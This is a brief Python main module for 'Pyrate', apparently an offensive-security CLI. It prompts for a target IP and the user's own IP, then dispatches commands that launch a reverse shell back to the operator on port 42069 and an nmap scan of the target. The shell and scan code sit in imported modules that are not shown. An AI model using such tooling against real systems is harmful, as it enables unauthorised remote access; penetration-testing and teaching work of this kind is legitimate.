from cli import CLI
from reverse_shell import ReverseShell
from nmap_wrap import NmapWrap

class Pyrate:
    def __init__(self):
        self.cli = CLI()
        self.cli.prompt_text = "Pyrate"
        self.running = True

        self.target_ip = None
        self.host_ip = None
        self.ask_initial_questions()

    def main_loop(self):
        while self.running:
            prompt = self.cli.cli_prompt()
            self.handle_command(prompt)

    def handle_command(self, prompt):
        if prompt.lower() == "reverse":
            self.start_reverse_shell()
        if prompt.lower() == "nmap":
            self.start_nmap_wrap()
        if prompt.lower() == "bye":
            self.running = False

    def ask_initial_questions(self):
        self.cli.cli_print("What is your target IP?")
        self.target_ip = self.cli.cli_prompt()
        self.cli.cli_print("What is your OWN IP?")
        self.host_ip = self.cli.cli_prompt()

    def start_reverse_shell(self):
        r = ReverseShell(self.host_ip, 42069, self.target_ip)
        r.run()

    def start_nmap_wrap(self):
        nmap_wrap = NmapWrap(self.target_ip)
        nmap_wrap.run()
